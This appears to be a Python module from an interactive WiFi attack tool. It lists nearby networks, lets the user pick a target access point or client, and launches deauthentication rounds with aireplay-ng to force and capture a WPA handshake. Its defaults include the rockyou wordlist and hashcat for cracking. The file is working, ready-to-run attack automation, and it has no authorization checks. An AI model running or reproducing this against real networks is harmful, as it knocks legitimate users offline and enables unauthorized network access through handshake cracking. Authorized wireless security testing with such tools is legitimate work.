#!/usr/bin/env python3
"""
Network Scanning and Handshake Capture Module
Handles WiFi interface management, network discovery, and handshake capture
"""

import os
import sys
import time
import signal
import subprocess
import re
import json
import glob
import configparser 
from datetime import datetime
from pathlib import Path
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm

console = Console()

# Global variables for process management
capture_process = None
deauth_process = None
running = True


class WPAScanner:
    """Main WPA scanning and attack class"""
    
    def __init__(self, args):
        self.args = args
        self.interface = getattr(args, 'iface', None) or getattr(args, 'interface', None)
        self.monitor_interface = None
        self.target_ap = None
        self.target_client = None
        self.capture_file = None
        self.handshake_file = None
        self.config = self.load_config()
        self.output_dir = None
        self.session_name = None
        
    def load_config(self):
        """Load configuration from config.ini"""
        config = configparser.ConfigParser()
        config['DEFAULT'] = {
            'scan_time': '30',
            'deauth_packets': '10',
            'deauth_rounds': '3',
            'capture_timeout': '180',
            'wordlist_path': '/usr/share/wordlists/rockyou.txt',
            'hashcat_rules': '',
            'output_dir': './captures'
        }
        
        if os.path.exists('config.ini'):
            config.read('config.ini')
        return config
    
    def check_dependencies(self):
        """Check if all required tools are installed"""
        console.print("\n[bold cyan][*] Checking dependencies...[/bold cyan]")
        
        tools = {
            'aircrack-ng': 'aircrack-ng',
            'airodump-ng': 'aircrack-ng',
            'aireplay-ng': 'aircrack-ng',
            'tcpdump': 'tcpdump',
            'hcxpcapngtool': 'hcxtools',
            'hashcat': 'hashcat',
            'iwconfig': 'wireless-tools',
            'iw': 'iw'
        }
        
        missing = []
        for tool, package in tools.items():
            if os.system(f"which {tool} > /dev/null 2>&1") != 0:
                missing.append(f"{tool} ({package})")
        
        if missing:
            console.print("[bold red][✗] Missing dependencies:[/bold red]")
            for dep in missing:
                console.print(f"    - {dep}")
            console.print("\n[yellow]Install with: sudo apt install aircrack-ng tcpdump hcxtools hashcat wireless-tools iw[/yellow]")
            return False
        
        console.print("[bold green][✓] All dependencies installed[/bold green]")
        return True
    
    def setup_interface(self, interface=None):
        """Setup wireless interface (auto-detect if not specified)"""
        if not interface:
            interfaces = self.list_interfaces()
            if not interfaces:
                return False
            iface_num = Prompt.ask("Select interface number", default="1")
            try:
                interface = interfaces[int(iface_num) - 1]
            except (ValueError, IndexError):
                console.print("[bold red][✗] Invalid selection[/bold red]")
                return False
        
        return self.enable_monitor_mode(interface)
    
    def reset(self):
        """Reset scanner state for new attack"""
        self.monitor_interface = None
        self.capture_file = None
        self.handshake_file = None
        self.target_ap = None
        self.target_client = None
    
    def list_interfaces(self):
        """List available wireless interfaces"""
        console.print("\n[bold cyan][*] Scanning wireless interfaces...[/bold cyan]")
        
        try:
            result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            interfaces = []
            
            for line in result.stdout.split('\n'):
                if line and not line.startswith(' ') and not line.startswith('\t'):
                    parts = line.split()
                    if parts and 'IEEE 802.11' in line:
                        iface = parts[0]
                        if iface not in interfaces:
                            interfaces.append(iface)
            
            if not interfaces:
                console.print("[bold red][✗] No wireless interfaces found![/bold red]")
                return None
            
            table = Table(title="Available Interfaces")
            table.add_column("#", style="cyan")
            table.add_column("Interface", style="green")
            table.add_column("Type", style="yellow")
            
            for idx, iface in enumerate(interfaces, 1):
                # Check interface type
                try:
                    iw_info = subprocess.run(['iw', 'dev', iface, 'info'], 
                                           capture_output=True, text=True)
                    if 'type monitor' in iw_info.stdout:
                        iface_type = "Monitor"
                    elif 'type managed' in iw_info.stdout:
                        iface_type = "Managed"
                    else:
                        iface_type = "Unknown"
                except:
                    iface_type = "Unknown"
                
                table.add_row(str(idx), iface, iface_type)
            
            console.print(table)
            return interfaces
            
        except Exception as e:
            console.print(f"[bold red][✗] Error listing interfaces: {e}[/bold red]")
            return None

    def _kill_sudo_process(self, proc, pattern):
        """Kill both the sudo wrapper and its real child by name pattern"""
        if proc and proc.poll() is None:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                pass
        # airodump-ng/aireplay-ng may survive as orphans under sudo
        subprocess.run(['sudo', 'pkill', '-INT', '-f', pattern], capture_output=True)
    
    def enable_monitor_mode(self, interface):
        """Enable monitor mode on the selected interface"""
        console.print(f"\n[bold cyan][*] Enabling monitor mode on {interface}...[/bold cyan]")

        # First, clean up any existing monitor interfaces
        try:
            # Check for existing monitor interfaces
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Mode:Monitor' in line:
                    mon_iface = line.split()[0]
                    if mon_iface != interface:  # Don't stop our target if it's already monitor
                        console.print(f"[dim]Stopping existing monitor interface: {mon_iface}[/dim]")
                        subprocess.run(['sudo', 'airmon-ng', 'stop', mon_iface], 
                                    capture_output=True, timeout=5)
        except:
            pass
        
        # Verify if already in monitor mode
        try:
            iw_info = subprocess.run(['iw', 'dev', interface, 'info'], 
                                capture_output=True, text=True, check=False)
            if "type monitor" in iw_info.stdout:
                console.print(f"[bold yellow][!] {interface} is already in monitor mode. Continuing...[/bold yellow]")
                self.monitor_interface = interface
                return True
        except Exception:
            pass
        
        # Check if interface name already has 'mon' suffix
        base_interface = interface
        if interface.endswith('mon'):
            base_interface = interface[:-3]  # Remove trailing 'mon'
            console.print(f"[dim]Base interface detected: {base_interface}[/dim]")
        
        try:
            # Kill interfering processes
            console.print("[dim]Killing interfering processes...[/dim]")
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                        capture_output=True, timeout=10)
            
            # Start monitor mode
            console.print("[dim]Starting monitor mode...[/dim]")
            result = subprocess.run(['sudo', 'airmon-ng', 'start', base_interface], 
                                capture_output=True, text=True, timeout=15)
            
            # Parse monitor interface name - look for the new interface created
            self.monitor_interface = None
            
            # Method 1: Look for standard patterns in output
            for line in result.stdout.split('\n'):
                # Pattern: "PHY	Interface	Driver		Chipset"
                # The monitor interface is usually listed after the physical interface
                if 'monitor mode enabled' in line.lower():
                    # Try to find the monitor interface name
                    match = re.search(r'enabled on ([\w]+)', line, re.IGNORECASE)
                    if match:
                        self.monitor_interface = match.group(1)
                        break
                    
                    # Alternative pattern
                    match = re.search(r'on\s+(\w+)', line)
                    if match:
                        self.monitor_interface = match.group(1)
                        break
            
            # Method 2: Check common naming patterns
            if not self.monitor_interface:
                # Try standard naming: wlan1 -> wlan1mon
                possible_names = [
                    f"{base_interface}mon",
                    f"mon{base_interface}",
                    f"{base_interface}mon0",
                    "mon0"
                ]
                
                for iface_name in possible_names:
                    if os.path.exists(f"/sys/class/net/{iface_name}"):
                        # Also check if it's actually in monitor mode
                        check = subprocess.run(['iw', 'dev', iface_name, 'info'], 
                                            capture_output=True, text=True)
                        if "type monitor" in check.stdout:
                            self.monitor_interface = iface_name
                            break
            
            # Method 3: List all interfaces and find the one in monitor mode
            if not self.monitor_interface:
                try:
                    iw_info = subprocess.run(['iwconfig'], capture_output=True, text=True)
                    for line in iw_info.stdout.split('\n'):
                        if 'Mode:Monitor' in line:
                            iface_name = line.split()[0]
                            # Make sure it's related to our interface
                            if base_interface in iface_name or iface_name.startswith('mon'):
                                self.monitor_interface = iface_name
                                break
                except:
                    pass
            
            if self.monitor_interface:
                console.print(f"[bold green][✓] Monitor mode enabled on {self.monitor_interface}[/bold green]")
                
                # Verify it's working
                time.sleep(1)
                verify = subprocess.run(['iw', 'dev', self.monitor_interface, 'info'],
                                    capture_output=True, text=True)
                if "type monitor" in verify.stdout:
                    console.print("[green][✓] Monitor mode verified[/green]")
                    return True
                else:
                    console.print("[yellow][!] Monitor mode may not be working correctly[/yellow]")
                    return True
            else:
                console.print("[bold red][✗] Failed to enable monitor mode[/bold red]")
                console.print("[dim]Debug: Output from airmon-ng:[/dim]")
                console.print(f"[dim]{result.stdout}[/dim]")
                return False
                    
        except Exception as e:
            console.print(f"[bold red][✗] Error enabling monitor mode: {e}[/bold red]")
            return False


    def cleanup_monitor_interfaces(self):
        """Clean up all monitor interfaces"""
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Mode:Monitor' in line:
                    mon_iface = line.split()[0]
                    console.print(f"[dim]Cleaning up monitor interface: {mon_iface}[/dim]")
                    subprocess.run(['sudo', 'airmon-ng', 'stop', mon_iface], 
                                capture_output=True, timeout=5)
        except Exception as e:
            console.print(f"[dim]Cleanup error: {e}[/dim]")

    def scan_networks(self, duration=30):
        """Scan for nearby WiFi networks with interruptible sleep"""
        global running
        
        console.print(f"\n[bold cyan][*] Scanning networks for {duration} seconds...[/bold cyan]")
        console.print("[dim]Press Ctrl+C to stop scan early[/dim]")
        
        temp_file = f"/tmp/wpa_scan_{int(time.time())}"
        csv_file = temp_file + '-01.csv'
        
        # Clean old files
        for f in glob.glob(f"{temp_file}*"):
            try:
                os.remove(f)
            except:
                pass
        
        try:
            cmd = [
                'sudo', 'airodump-ng',
                '--write', temp_file,
                '--output-format', 'csv',
                '--write-interval', '1',
                '--showack',
                self.monitor_interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Interruptible sleep
            start_time = time.time()
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                console=console
            ) as progress:
                task = progress.add_task("[cyan]Scanning...", total=duration)
                
                while time.time() - start_time < duration and running:
                    time.sleep(0.5)
                    if running:
                        progress.update(task, advance=0.5)
                    else:
                        break
            
            process.terminate()
            process.wait(timeout=3)
            
            if not running:
                return None
            
            # Wait for file to be written
            time.sleep(1)
            
            if not os.path.exists(csv_file):
                console.print(f"[yellow][!] No networks detected. Try moving closer to AP.[/yellow]")
                return None
            
            networks = self.parse_airodump_csv(csv_file)
            
            # Aggiungi anche reti dal beacon tracking
            networks = self.detect_hidden_networks(networks, temp_file)
            
            if not networks:
                console.print("[bold red][✗] No networks found![/bold red]")
                return None
            
            # Display networks
            table = Table(title="Discovered Networks", show_lines=True)
            table.add_column("#", style="cyan", width=4)
            table.add_column("BSSID", style="green")
            table.add_column("Channel", style="yellow", width=8)
            table.add_column("Encryption", style="red", width=12)
            table.add_column("Power", style="magenta", width=8)
            table.add_column("ESSID", style="blue")
            table.add_column("Status", style="cyan", width=10)
            table.add_column("Clients", style="cyan", width=8)
            
            for idx, net in enumerate(networks, 1):
                encryption = net.get('Privacy', 'Unknown')
                if 'WPA3' in encryption:
                    enc_style = "[bold green]WPA3[/bold green]"
                elif 'WPA2' in encryption:
                    enc_style = "[yellow]WPA2[/yellow]"
                elif 'WPA' in encryption:
                    enc_style = "[red]WPA[/red]"
                elif 'WEP' in encryption:
                    enc_style = "[bold red]WEP[/bold red]"
                else:
                    enc_style = "[dim]OPEN[/dim]"
                
                # Check if hidden network
                essid = net.get('ESSID', '')
                if not essid or essid == 'Hidden' or len(essid) == 0:
                    status = "[red]HIDDEN[/red]"
                    display_essid = "[red]<Hidden Network>[/red]"
                else:
                    status = "[green]Visible[/green]"
                    display_essid = essid[:30]
                
                table.add_row(
                    str(idx),
                    net.get('BSSID', 'Unknown'),
                    net.get('channel', '?'),
                    enc_style,
                    net.get('Power', '?'),
                    display_essid,
                    status,
                    str(net.get('clients', '?'))
                )
            
            console.print(table)
            return networks
            
        except Exception as e:
            console.print(f"[bold red][✗] Scan error: {e}[/bold red]")
            return None

    def detect_hidden_networks(self, networks, temp_file):
        """Detect hidden networks from probe requests"""
        try:
            probe_file = temp_file + '-01.kismet.csv'
            if os.path.exists(probe_file):
                with open(probe_file, 'r') as f:
                    for line in f:
                        if 'Probe Request' in line:
                            parts = line.split(',')
                            if len(parts) > 6:
                                bssid = parts[2].strip()
                                probed_essid = parts[5].strip().strip('"')
                                if probed_essid and len(probed_essid) > 0:
                                    # Aggiorna o aggiungi network con SSID rivelato
                                    for net in networks:
                                        if net.get('BSSID') == bssid and (not net.get('ESSID') or net.get('ESSID') == ''):
                                            net['ESSID'] = probed_essid
                                            net['Hidden'] = True
                                    else:
                                        # Nuova rete nascosta
                                        networks.append({
                                            'BSSID': bssid,
                                            'ESSID': probed_essid,
                                            'channel': '?',
                                            'Privacy': 'Unknown',
                                            'Power': '?',
                                            'Hidden': True,
                                            'clients': '?'
                                        })
        except:
            pass
        
        # Marca reti con ESSID vuoto come nascoste
        for net in networks:
            if not net.get('ESSID') or net.get('ESSID') == '' or net.get('ESSID') == '(hidden)':
                net['ESSID'] = 'Hidden'
                net['Hidden'] = True
        
        return networks

    def parse_airodump_csv(self, csv_file):
        """Parse airodump-ng CSV output"""
        networks = []
        try:
            if not os.path.exists(csv_file):
                return []
            
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Find the start of network data
            network_start = False
            for line in lines:
                if 'BSSID' in line and 'ESSID' in line:
                    network_start = True
                    continue
                if network_start and line.strip():
                    # Skip station data
                    if 'Station MAC' in line:
                        break
                    
                    parts = line.strip().split(',')
                    if len(parts) >= 14:
                        network = {
                            'BSSID': parts[0].strip(),
                            'First time seen': parts[1].strip(),
                            'Last time seen': parts[2].strip(),
                            'channel': parts[3].strip(),
                            'Speed': parts[4].strip(),
                            'Privacy': parts[5].strip(),
                            'Cipher': parts[6].strip(),
                            'Authentication': parts[7].strip(),
                            'Power': parts[8].strip(),
                            'beacons': parts[9].strip(),
                            'IV': parts[10].strip(),
                            'LAN IP': parts[11].strip(),
                            'ID-Length': parts[12].strip(),
                            'ESSID': parts[13].strip(),
                            'Key': '' if len(parts) < 15 else parts[14].strip()
                        }
                        network['clients'] = '?'
                        networks.append(network)
        except Exception as e:
            console.print(f"[yellow][!] CSV parse warning: {e}[/yellow]")
        
        return networks
    
    def select_target(self, networks):
        """Let user select target network"""
        net_num = Prompt.ask("Select target network number", default="1")
        try:
            target = networks[int(net_num) - 1]
            console.print(f"\n[bold cyan]Target: {target.get('ESSID', 'Unknown')} ({target.get('BSSID', 'Unknown')})[/bold cyan]")
            return target
        except (ValueError, IndexError):
            console.print("[bold red][✗] Invalid selection[/bold red]")
            return None
    
    def discover_clients(self, bssid, channel):
        """Discover clients connected to the target AP with interruptible sleep"""
        global running
        
        console.print(f"\n[bold cyan][*] Scanning for clients on {bssid} (Channel {channel})...[/bold cyan]")
        console.print("[dim]Scanning for 15 seconds...[/dim]")
        
        temp_file = f"/tmp/wpa_clients_{int(time.time())}"
        
        try:
            cmd = [
                'sudo', 'airodump-ng',
                '--bssid', bssid,
                '--channel', str(channel),
                '--write', temp_file,
                '--output-format', 'csv',
                self.monitor_interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Interruptible sleep
            for i in range(15):
                if not running:
                    break
                time.sleep(1)
            
            process.terminate()
            process.wait(timeout=3)
            time.sleep(1)
            
            if not running:
                return None
            
            # Parse clients
            clients_file = temp_file + '-01.csv'
            clients = self.parse_clients_csv(clients_file)
            
            if not clients:
                console.print("[yellow][!] No clients found. You can still attack (broadcast deauth).[/yellow]")
                return None
            
            table = Table(title=f"Connected Clients - {bssid}")
            table.add_column("#", style="cyan")
            table.add_column("Station MAC", style="green")
            table.add_column("Power", style="yellow")
            table.add_column("Packets", style="magenta")
            table.add_column("Probes", style="blue")
            
            for idx, client in enumerate(clients, 1):
                table.add_row(
                    str(idx),
                    client.get('Station MAC', 'Unknown'),
                    client.get('Power', '?'),
                    client.get('packets', '?'),
                    client.get('Probed ESSIDs', 'None')[:30]
                )
            
            console.print(table)
            return clients
            
        except Exception as e:
            console.print(f"[bold red][✗] Client scan error: {e}[/bold red]")
            return None
    
    def parse_clients_csv(self, csv_file):
        """Parse clients from airodump CSV"""
        clients = []
        try:
            if not os.path.exists(csv_file):
                return []
            
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Find station data section
            station_start = False
            for line in lines:
                if 'Station MAC' in line:
                    station_start = True
                    continue
                if station_start and line.strip():
                    parts = line.strip().split(',')
                    if len(parts) >= 6:
                        client = {
                            'Station MAC': parts[0].strip(),
                            'First time seen': parts[1].strip(),
                            'Last time seen': parts[2].strip(),
                            'Power': parts[3].strip(),
                            'packets': parts[4].strip(),
                            'BSSID': parts[5].strip(),
                            'Probed ESSIDs': '' if len(parts) < 7 else ','.join(parts[6:]).strip()
                        }
                        clients.append(client)
        except Exception as e:
            console.print(f"[yellow][!] Client parse warning: {e}[/yellow]")
        
        return clients
    
    def select_client(self, clients):
        """Let user select client for targeted deauth"""
        client_choice = Prompt.ask(
            "Select client number (0 for broadcast deauth)",
            default="0"
        )
        if client_choice != "0":
            try:
                target_client = clients[int(client_choice) - 1]['Station MAC']
                console.print(f"[dim]Targeting client: {target_client}[/dim]")
                return target_client
            except (ValueError, IndexError):
                console.print("[yellow][!] Invalid selection, using broadcast[/yellow]")
                return None
        return None
    
    def start_capture_and_deauth(self, essid, bssid, channel, client=None, timeout=180):
        """Start packet capture and deauthentication attack"""
        global capture_process, deauth_process, running
        
        output_dir = self.config['DEFAULT']['output_dir']
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        sanitized_essid = essid.replace(" ", "-")
        session_name = f"{sanitized_essid}-{timestamp}"
        capture_path = os.path.join(output_dir, session_name)
        os.makedirs(capture_path, exist_ok=True)
        
        self.capture_file = os.path.join(capture_path, "capture")
        self.output_dir = output_dir
        self.session_name = session_name
        
        console.print(f"\n[bold cyan][*] Starting capture on channel {channel}...[/bold cyan]")
        console.print(f"[dim]Target: {essid if essid else 'Unknown'} ({bssid})[/dim]")
        console.print(f"[dim]Output: {self.capture_file}.cap[/dim]")
        
        capture_cmd = [
            'sudo', 'airodump-ng',
            '--bssid', bssid,
            '--channel', str(channel),
            '--write', self.capture_file,
            '--output-format', 'pcap',
            self.monitor_interface
        ]
        
        try:
            capture_process = subprocess.Popen(
                capture_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL  
            )
            console.print("[green][✓] Capture started[/green]")
            
            console.print("[yellow][!] Waiting 10 seconds before starting deauth attack...[/yellow]")
            for i in range(10):
                if not running:
                    self._stop_capture()        
                    return False
                time.sleep(1)
            
            deauth_packets = int(self.config['DEFAULT']['deauth_packets'])
            deauth_rounds = int(self.config['DEFAULT']['deauth_rounds'])
            
            if client:
                console.print(f"[bold red][*] Starting targeted deauth attack on {client}...[/bold red]")
                deauth_cmd = [
                    'sudo', 'aireplay-ng',
                    '--deauth', str(deauth_packets),
                    '-a', bssid,
                    '-c', client,
                    self.monitor_interface
                ]
            else:
                console.print(f"[bold red][*] Starting broadcast deauth attack...[/bold red]")
                deauth_cmd = [
                    'sudo', 'aireplay-ng',
                    '--deauth', str(deauth_packets),
                    '-a', bssid,
                    self.monitor_interface
                ]
            
            handshake_captured = False
            
            for round_num in range(deauth_rounds):
                if not running:
                    break
                
                console.print(f"[cyan]Deauth round {round_num + 1}/{deauth_rounds}[/cyan]")
                deauth_process = subprocess.Popen(
                    deauth_cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL 
                )
                deauth_process.wait()
                
                if self.check_handshake():
                    console.print("[bold green][✓] WPA Handshake captured![/bold green]")
                    handshake_captured = True
                    break
                
                if round_num < deauth_rounds - 1 and running:
                    for i in range(5):
                        if not running:
                            break
                        time.sleep(1)
            
            if not handshake_captured and running:
                console.print(f"[cyan][*] Monitoring for handshake (timeout: {timeout}s)...[/cyan]")
                start_time = time.time()
                
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(),
                    console=console
                ) as progress:
                    task = progress.add_task("[yellow]Waiting for handshake...", total=timeout)
                    
                    while time.time() - start_time < timeout and running:
                        if self.check_handshake():
                            progress.update(task, completed=timeout)
                            console.print("[bold green][✓] WPA Handshake captured![/bold green]")
                            handshake_captured = True
                            break
                        
                        time.sleep(2)
                        if running:
                            progress.update(task, advance=2)
            
            if not handshake_captured and running:
                console.print("[yellow][!] Timeout reached. Checking for handshake one more time...[/yellow]")
                handshake_captured = self.check_handshake()
            
            self._stop_capture()   
            return handshake_captured
            
        except Exception as e:
            self._stop_capture() 
            if not running:
                console.print("\n[yellow][!] Capture interrupted by user[/yellow]")
            else:
                console.print(f"[bold red][✗] Attack error: {e}[/bold red]")
            return False

    def _stop_capture(self):
        """Kill airodump-ng cleanly, including the real child spawned under sudo"""
        global capture_process
        if capture_process and capture_process.poll() is None:
            try:
                capture_process.terminate()
                capture_process.wait(timeout=2)
            except Exception:
                pass
            
        if self.capture_file:
            subprocess.run(
                ['sudo', 'pkill', '-INT', '-f', f'airodump-ng.*{os.path.basename(self.capture_file)}'],
                capture_output=True
            )
        capture_process = None
    
    def check_handshake(self):
        """Check if WPA handshake has been captured"""
        if not self.capture_file:
            return False
        
        cap_file = self.capture_file + '-01.cap'
        if not os.path.exists(cap_file):
            return False
        
        try:
            # Check with aircrack-ng for EAPOL packets
            result = subprocess.run(
                ['aircrack-ng', cap_file],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if '1 handshake' in result.stdout or 'WPA' in result.stdout:
                # Count EAPOL packets with tcpdump
                tcpdump_result = subprocess.run(
                    ['tcpdump', '-r', cap_file, '-c', '10', '-nn', 'ether proto 0x888e'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                
                eapol_count = len([l for l in tcpdump_result.stdout.split('\n') if 'EAPOL' in l or '0x888e' in l])
                
                if eapol_count >= 2:  # At least 2 EAPOL messages
                    self.handshake_file = cap_file
                    return True
            
            return False
            
        except subprocess.TimeoutExpired:
            return False
        except Exception:
            return False
    
    def list_handshake_files(self):
        """List all captured handshake files in the captures directory"""
        capture_dir = self.config['DEFAULT']['output_dir']
        if not os.path.exists(capture_dir):
            return []
        
        # Cerca file .cap che potrebbero contenere handshake
        cap_files = glob.glob(f"{capture_dir}/**/capture-01.cap", recursive=True)
        cap_files.extend(glob.glob(f"{capture_dir}/*.cap"))
        
        valid_handshakes = []
        for cap_file in cap_files:
            # Verifica se contiene handshake
            try:
                result = subprocess.run(
                    ['aircrack-ng', cap_file],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if '1 handshake' in result.stdout or 'WPA handshake' in result.stdout:
                    # Ottieni informazioni sul file
                    file_size = os.path.getsize(cap_file)
                    mod_time = datetime.fromtimestamp(os.path.getmtime(cap_file))
                    
                    # Estrai nome della sessione
                    parent_dir = os.path.basename(os.path.dirname(cap_file))
                    if parent_dir.startswith('wpa_capture_'):
                        name = parent_dir
                    else:
                        name = os.path.basename(cap_file)
                    
                    valid_handshakes.append({
                        'path': cap_file,
                        'size': f"{file_size / 1024:.1f} KB",
                        'date': mod_time.strftime("%Y-%m-%d %H:%M:%S"),
                        'name': name
                    })
            except:
                pass
        
        return valid_handshakes
    
    def cleanup(self):
        """Clean up processes and restore network manager"""
        global capture_process, deauth_process
        
        console.print("\n[cyan][*] Cleaning up...[/cyan]")
        
        # Kill processes
        for proc in [capture_process, deauth_process]:
            if proc and proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except:
                    proc.kill()
        
        capture_process = None
        deauth_process = None
        
        # Clean up all monitor interfaces
        self.cleanup_monitor_interfaces()
        
        # Restart NetworkManager
        try:
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
                        capture_output=True, timeout=10)
            console.print("[green][✓] NetworkManager restarted[/green]")
        except:
            try:
                subprocess.run(['sudo', 'service', 'network-manager', 'restart'],
                            capture_output=True, timeout=10)
                console.print("[green][✓] NetworkManager restarted[/green]")
            except:
                pass
        
        console.print("[green][✓] Cleanup complete[/green]")